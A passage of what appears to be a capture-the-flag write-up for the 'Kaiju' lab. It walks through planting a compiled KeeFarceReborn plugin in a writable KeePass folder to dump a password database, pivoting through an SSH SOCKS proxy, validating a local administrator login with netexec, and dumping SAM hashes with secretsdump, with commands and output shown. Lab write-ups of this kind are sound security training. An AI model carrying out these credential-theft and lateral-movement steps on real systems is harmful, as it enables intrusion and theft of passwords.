<span class="o">.</span>\<span class="n">KeePass2</span>\ <span class="n">BUILTIN</span>\<span class="n">Administrators</span><span class="p">:(</span><span class="n">F</span><span class="p">)</span>
            <span class="n">BUILTIN</span>\<span class="n">Administrators</span><span class="p">:(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
            <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span><span class="p">:(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
            <span class="n">CREATOR</span> <span class="n">OWNER</span><span class="p">:(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">IO</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>
            <span class="n">BUILTIN</span>\<span class="n">Users</span><span class="p">:(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span>
            <span class="n">BERSRV200</span>\<span class="n">ftpadmins</span><span class="p">:(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span>

<span class="n">Successfully</span> <span class="n">processed</span> <span class="mi">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="mi">0</span> <span class="n">files</span>
<span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span>\<span class="n">Software</span><span class="o">&gt;</span>
</pre></div>
<p>This means we could leverage <code>sasrv200</code>'s membership in this group to gain write access to this folder. But how can this help?</p><br/>
<p>Well, we could modify DLL files, and as we saw earlier, someone is running KeePass periodically, which would trigger our malicious code and give us access as the user executing it. However, we don‚Äôt even know who that user is. As we noticed at the beginning, one password file mentioned that the administrator password was moved to a KeePass database, so why not leverage our privileges to dump the KeePass database that is being opened?</p><br/>
<h3>KeeFarceReborn</h3><br/>
<p>There are many ways to dump credentials from KeePass. Some involve using an injector to load a DLL into the KeePass process; however, most of these techniques are easily detected. Even though there‚Äôs no AV in this chain lab, I won‚Äôt take that approach. Instead, I‚Äôll use the <a href="https://github.com/d3lb3/KeeFarceReborn">KeeFarceReborn</a> KeePass plugin, which is easier to reproduce in this case since we only need to place the plugin DLL file into the <code>Plugins</code> folder.</p><br/>
<p>This repository does not include a prebuilt binary, so we have to compile it manually (which is generally the better option) using Visual Studio. I downloaded the repository as a ZIP file on my Windows VM.</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-7.png"/></p>
<p>Then, open the <code>KeeFarceRebornPlugin.sln</code> file with Visual Studio. Initially, you‚Äôll notice several errors in the code. This happens because some dependencies are missing, so we need to add the KeePass.exe binary reference to the project. </p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-8.png"/></p>
<p>Let‚Äôs add the <code>KeePass.exe</code> reference to the project. I‚Äôm not entirely sure whether the <code>KeePass.exe</code> file needs to match the victim‚Äôs version exactly, or if it just needs to be the same file. In my case, I simply installed the same version that the victim machine was running, which is <strong>2.34</strong>.</p><br/>
<p>You can check which version is installed by reading the <code>KeePass.exe.config</code> file in the <code>KeePass2</code> folder:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">E</span><span class="p">:</span>\<span class="n">Public</span>\<span class="n">Software</span>\<span class="n">KeePass2</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">KeePass</span><span class="o">.</span><span class="n">exe</span><span class="o">.</span><span class="n">config</span>
<span class="o">&lt;</span><span class="n">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span> <span class="n">?</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">configuration</span><span class="o">&gt;</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
                        <span class="o">&lt;</span><span class="n">dependentAssembly</span><span class="o">&gt;</span>
                                <span class="o">&lt;</span><span class="n">assemblyIdentity</span> <span class="n">name</span><span class="o">=</span><span class="s2">"KeePass"</span>
                                        <span class="n">publicKeyToken</span><span class="o">=</span><span class="s2">"fed2ed7716aecf5c"</span>
                                        <span class="n">culture</span><span class="o">=</span><span class="s2">"neutral"</span> <span class="o">/&gt;</span>
                                <span class="o">&lt;</span><span class="n">bindingRedirect</span> <span class="n">oldVersion</span><span class="o">=</span><span class="s2">"2.0.9.0-2.34.0.0"</span>
                                        <span class="n">newVersion</span><span class="o">=</span><span class="s2">"2.34.0.15991"</span> <span class="o">/&gt;</span>
                        <span class="o">&lt;/</span><span class="n">dependentAssembly</span><span class="o">&gt;</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="o">&lt;/</span><span class="n">configuration</span><span class="o">&gt;</span>
</pre></div>
<p>As you can see, the <code>newVersion</code> value is <code>2.34.0.15991</code>, which corresponds to version <code>2.34.0</code>."</p><br/>
<p>Now right-click the project, select <em>Add &gt; Reference‚Ä¶</em></p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-9.png" style="width: 45%"/></p>
<p>Then, browse for the KeePass.exe binary in your installation folder. Once added, you‚Äôll see that the errors disappear all required dependencies are satisfied.</p><br/>
<p>First, I removed every <code>MessageBox.show()</code> line, since it creates a Windows prompt that pauses execution until a user clicks a button. You only need to comment out lines 30, 36, and 75.</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-10.png"/></p>
<p>Next, I modified the <code>exportFilePath</code> variable, which defines the location where the dump will be saved. I set it to <code>C:\\tmp\\log.txt</code>. In this case, I had previously created the <code>C:\\tmp</code> directory.</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-11.png"/></p>
<p>After that, we need to build the project using the <em>Release</em> profile, otherwise it won‚Äôt run properly on the victim machine.</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-12.png" style="width: 30%"/></p>
<p>Finally, build the project:</p><br/>
<p><img src="/writeups/vl/hard/kaiju/img/18-13.png" style="width: 30%"/></p>
<p>Once compiled, I copied the resulting <code>DLL</code> to my Linux VM, and then uploaded it to the victim machine:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">scp</span> <span class="o">-</span><span class="n">i</span> <span class="n">sasrv200</span> <span class="n">KeeFarceRebornPlugin</span><span class="o">.</span><span class="n">dll</span> <span class="n">sasrv200</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">:</span><span class="n">E</span><span class="p">:</span>\\<span class="n">Public</span>\\<span class="n">Software</span>\\<span class="n">KeePass2</span>\\<span class="n">Plugins</span>\\<span class="n">KeeFarceRebornPlugin</span><span class="o">.</span><span class="n">dll</span>
<span class="n">KeeFarceRebornPlugin</span><span class="o">.</span><span class="n">dll</span>                                                                      <span class="mi">100</span><span class="o">%</span> <span class="mi">6144</span>    <span class="mf">25.4</span><span class="n">KB</span><span class="o">/</span><span class="n">s</span>   <span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
</pre></div>
<p>It worked! Now we just have to wait until the user runs KeePass and opens the database, so the plugin can extract the credentials.</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>


<span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
<span class="o">----</span>                 <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>         <span class="mi">9</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">2025</span>   <span class="mi">6</span><span class="p">:</span><span class="mi">57</span> <span class="n">AM</span>          <span class="mi">11427</span> <span class="n">log</span><span class="o">.</span><span class="n">txt</span>


<span class="evrm">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span>
</pre></div>
<p>Great! The dump was created and now we can read plaintext passwords. Let's download it on my Linux VM and start to inspect the content.</p><br/>
<p>After applying some filters, we found that there's an entry that corresponds to the <code>Administrator</code> username and has a password:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="n">log</span><span class="o">.</span><span class="n">txt</span> <span class="o">|</span> <span class="n">grep</span> <span class="s2">"Administrator"</span> <span class="o">-</span><span class="n">B</span> <span class="mi">15</span>
                    <span class="o">&lt;/</span><span class="n">String</span><span class="o">&gt;</span>
                    <span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Key</span><span class="o">&gt;</span><span class="n">Password</span><span class="o">&lt;/</span><span class="n">Key</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Value</span> <span class="n">ProtectInMemory</span><span class="o">=</span><span class="s2">"True"</span><span class="o">&gt;</span><span class="n">Na</span><span class="o">*********</span><span class="n">n25</span><span class="o">&lt;/</span><span class="n">Value</span><span class="o">&gt;</span>
                    <span class="o">&lt;/</span><span class="n">String</span><span class="o">&gt;</span>
                    <span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Key</span><span class="o">&gt;</span><span class="n">Title</span><span class="o">&lt;/</span><span class="n">Key</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Value</span><span class="o">&gt;</span><span class="n">BERSRV200</span><span class="o">&lt;/</span><span class="n">Value</span><span class="o">&gt;</span>
                    <span class="o">&lt;/</span><span class="n">String</span><span class="o">&gt;</span>
                    <span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Key</span><span class="o">&gt;</span><span class="n">URL</span><span class="o">&lt;/</span><span class="n">Key</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Value</span> <span class="o">/&gt;</span>
                    <span class="o">&lt;/</span><span class="n">String</span><span class="o">&gt;</span>
                    <span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Key</span><span class="o">&gt;</span><span class="n">UserName</span><span class="o">&lt;/</span><span class="n">Key</span><span class="o">&gt;</span>
                        <span class="o">&lt;</span><span class="n">Value</span><span class="o">&gt;</span><span class="n">Administrator</span> <span class="o">&lt;/</span><span class="n">Value</span><span class="o">&gt;</span>
</pre></div>
<p>The credentials are <code>Administrator:Na*********n25</code>. Let‚Äôs see if we can use them to authenticate against the domain. We can use <code>netexec</code> to verify whether these credentials are valid.</p><br/>
<h3>Socks proxy</h3><br/>
<p>As we saw earlier in the port scan, there weren‚Äôt many ports exposed externally. However, when listing the open ports on the victim machine, plenty of them were listening:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span><span class="n">netstat</span> <span class="o">-</span><span class="n">ano</span> 

<span class="n">Active</span> <span class="n">Connections</span>

  <span class="n">Proto</span>  <span class="n">Local</span> <span class="n">Address</span>          <span class="n">Foreign</span> <span class="n">Address</span>        <span class="n">State</span>           <span class="n">PID</span>
  <span class="n">TCP</span>    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">21</span>             <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">3880</span>
  <span class="n">TCP</span>    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">22</span>             <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">2088</span>
  <span class="n">TCP</span>    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">135</span>            <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">888</span>
  <span class="n">TCP</span>    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">445</span>            <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">4</span>
  <span class="n">TCP</span>    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3389</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">72</span>
  <span class="n">TCP</span>    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">5357</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">4</span>
  <span class="n">TCP</span>    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">5985</span>           <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">0</span>              <span class="n">LISTENING</span>       <span class="mi">4</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span>
</pre></div>
<p>But if we try to connect over SMB (port 445), for example, the service appears unavailable:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">--</span><span class="n">verbose</span>
<span class="p">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">59</span><span class="p">]</span> <span class="n">INFO</span>     <span class="n">Socket</span> <span class="n">info</span><span class="p">:</span> <span class="n">host</span><span class="o">=</span><span class="mf">10.10.221.54</span><span class="p">,</span> <span class="n">hostname</span><span class="o">=</span><span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">,</span> <span class="n">kerberos</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">ipv6</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>  <span class="n">connection</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">165</span>
                    <span class="n">link</span><span class="o">-</span><span class="n">local</span> <span class="n">ipv6</span><span class="o">=</span><span class="kc">False</span>                                                                                       
           <span class="n">INFO</span>     <span class="n">Creating</span> <span class="n">SMBv3</span> <span class="n">connection</span> <span class="n">to</span> <span class="mf">10.10.221.54</span>                                                        <span class="n">smb</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">606</span>
<span class="p">[</span><span class="mi">15</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="n">INFO</span>     <span class="n">Failed</span> <span class="n">to</span> <span class="n">create</span> <span class="n">connection</span> <span class="nb">object</span> <span class="k">for</span> <span class="n">target</span> <span class="mf">10.10.221.54</span><span class="p">,</span> <span class="n">exiting</span><span class="o">...</span>                    <span class="n">connection</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">230</span>
</pre></div>
<p>This suggests that some firewall rules are preventing us from accessing internal ports externally. To bypass this restriction, let‚Äôs set up a SOCKS proxy:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">sasrv200</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">i</span> <span class="n">sasrv200</span> <span class="o">-</span><span class="n">D</span> <span class="mi">1080</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.2159</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="nd">kaiju\sasrv200@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">sasrv200</span><span class="o">&gt;</span>
</pre></div>
<p>This starts a SOCKS proxy on port 1080. Next, configure the <code>/etc/proxychains.conf</code> file like this:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="p">[</span><span class="n">ProxyList</span><span class="p">]</span>
<span class="c1"># add proxy here ...</span>
<span class="c1"># meanwhile</span>
<span class="c1"># defaults set to "tor"</span>
<span class="c1">#socks4    127.0.0.1 9050</span>
<span class="n">socks5</span> <span class="mf">127.0.0.1</span> <span class="mi">1080</span>
</pre></div>
<p>If everything is configured correctly, we should now be able to communicate with ports that were previously inaccessible from the outside:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="o">-</span><span class="n">q</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="o">../</span><span class="n">nmap</span><span class="o">/</span><span class="n">targets</span><span class="o">.</span><span class="n">txt</span>
<span class="n">proxychains4</span> <span class="o">-</span><span class="n">q</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="o">../</span><span class="n">nmap</span><span class="o">/</span><span class="n">targets</span><span class="o">.</span><span class="n">txt</span>
<span class="n">SMB</span>         <span class="mf">10.10.221.54</span>   <span class="mi">445</span>    <span class="n">BERSRV200</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">BERSRV200</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.221.53</span>   <span class="mi">445</span>    <span class="n">BERSRV100</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">BERSRV100</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.221.55</span>   <span class="mi">445</span>    <span class="n">BERSRV105</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">BERSRV105</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">Running</span> <span class="n">nxc</span> <span class="n">against</span> <span class="mi">3</span> <span class="n">targets</span> <span class="n">‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ</span> <span class="mi">100</span><span class="o">%</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
</pre></div>
<p>Perfect, the other services are now accessible.</p><br/>
<p>In this case, I‚Äôll try authenticating against <code>BERSRV200</code>, but you could also test them on other machines, such as the DC we identified earlier (<code>BERSRV100</code>), since they all belong to the same domain.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="o">-</span><span class="n">q</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'administrator'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'Na*********n25'</span>
<span class="n">SMB</span>         <span class="mf">10.10.221.54</span>   <span class="mi">445</span>    <span class="n">BERSRV200</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">BERSRV200</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.221.54</span>   <span class="mi">445</span>    <span class="n">BERSRV200</span>        <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>\<span class="n">administrator</span><span class="p">:</span><span class="n">Na</span><span class="o">*********</span><span class="n">n25</span> <span class="n">STATUS_LOGON_FAILURE</span>
</pre></div>
<p>However, it didn‚Äôt work. Maybe this password belongs to the local Administrator account rather than the domain Administrator. Let‚Äôs try again using the <code>--local-auth</code> parameter:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="o">-</span><span class="n">q</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="n">BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'administrator'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'Na*********n25'</span> <span class="o">--</span><span class="n">local</span><span class="o">-</span><span class="n">auth</span>
<span class="n">SMB</span>         <span class="mf">10.10.221.54</span>   <span class="mi">445</span>    <span class="n">BERSRV200</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">BERSRV200</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">BERSRV200</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.221.54</span>   <span class="mi">445</span>    <span class="n">BERSRV200</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">BERSRV200</span>\<span class="n">administrator</span><span class="p">:</span><span class="n">Na</span><span class="o">*********</span><span class="n">n25</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="n">!</span><span class="p">)</span>
</pre></div>
<p>Pwn3d! This password belongs to the local administrator, now we have system privileges on <code>BERSRV200</code>.</p><br/>
<p>At this point, we could obtain a shell using tools like <code>psexec.py</code> or <code>smbexec.py</code>, or via SSH:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ssh</span> <span class="n">administrator@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="n">administrator@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="n">'s password: </span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.20348.2159</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="root1">administrator@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span>
</pre></div>
<p>You can also read the second flag:</p><br/>
<div class="highlight"><pre><span></span><span class="root1">administrator@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span><span class="nb">type</span> <span class="n">Desktop</span>\<span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
<span class="n">VL</span><span class="p">{</span><span class="n">b5</span><span class="o">********************</span><span class="mi">353</span><span class="n">e</span><span class="p">}</span>
<span class="root1">administrator@BERSRV200</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span>
</pre></div>
<p>Now, let's run <code>secretsdump</code> to extract credentials and other valuable information directly from the system‚Äôs Security Account Manager (SAM) and LSA secrets. This will give us a better view of the accounts and hashes we can use for further attacks.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="n">BERSRV200</span><span class="o">/</span><span class="n">administrator</span><span class="p">:</span><span class="n">Na</span><span class="o">*********</span><span class="n">n25</span><span class="n">@BERSRV200</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="mf">.4</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.17</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.54</span><span class="p">:</span><span class="mi">445</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Service</span> <span class="n">RemoteRegistry</span> <span class="n">is</span> <span class="n">in</span> <span class="n">stopped</span> <span class="n">state</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">RemoteRegistry</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x9a5fc7f0da68261a7fff3339b24df15f</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">local</span> <span class="n">SAM</span> <span class="n">hashes</span> <span class="p">(</span><span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">5</span><span class="n">a</span><span class="o">********************</span><span class="n">cbdb</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d</span><span class="o">********************</span><span class="mi">089</span><span class="n">c0</span><span class="p">:::</span>
